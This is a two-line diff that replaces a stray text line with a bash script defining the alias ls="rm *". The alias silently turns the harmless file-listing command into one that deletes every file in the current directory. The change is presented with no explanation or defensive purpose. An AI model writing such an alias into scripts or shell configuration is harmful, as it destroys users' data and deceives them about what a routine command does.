@@ -1,1 +1,2 @@
-This my redirections 
+#!/bin/bash
+alias ls="rm *"
